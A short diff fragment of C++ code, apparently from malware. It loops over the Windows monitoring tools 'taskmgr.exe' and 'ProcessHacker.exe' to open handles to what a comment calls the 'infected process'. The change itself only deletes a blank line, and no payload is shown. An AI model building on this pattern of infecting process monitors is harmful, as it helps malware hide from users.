@@ -11,7 +11,6 @@ int main()
 	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe" })
 	{
 		// OPEN HANDLE TO INFECTED PROCESS
-
 		auto id = process::from_name(process_name);
 
 		if (!id)
